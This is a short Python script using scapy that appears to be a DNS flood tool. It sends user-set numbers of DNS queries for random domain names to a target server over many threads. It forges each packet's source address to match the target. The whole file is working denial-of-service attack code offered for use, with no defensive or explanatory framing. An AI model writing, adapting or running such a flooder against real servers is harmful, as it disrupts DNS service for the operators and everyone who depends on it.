from scapy.all import *
import os
import threading
import random
import string

def DNS_Flood(dstIP, counter):
    for _ in range(counter):
        domain = ''.join(random.choice(string.ascii_lowercase) for _ in range(6)) + ".com"
        IP_Packet = IP(src=dstIP, dst=dstIP)  # Setting both src and dst to dstIP
        UDP_Packet = UDP(dport=53)
        DNS_Packet = DNS(rd=1, qd=DNSQR(qname=domain))
        send(IP_Packet/UDP_Packet/DNS_Packet, verbose=0)

def main():
    os.system("clear")
    dstIP = input("\nDNS Server IP: ")
    counter = int(input("How many packets do you want to send: "))
    threads_count = int(input("How many threads do you want to use: "))

    packets_per_thread = counter // threads_count
    extra_packets = counter % threads_count

    threads = []
    for i in range(threads_count):
        thread_counter = packets_per_thread + (1 if i < extra_packets else 0)
        thread = threading.Thread(target=DNS_Flood, args=(dstIP, thread_counter))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("\nTotal packets sent: %i" % counter)

if __name__ == "__main__":
    main()
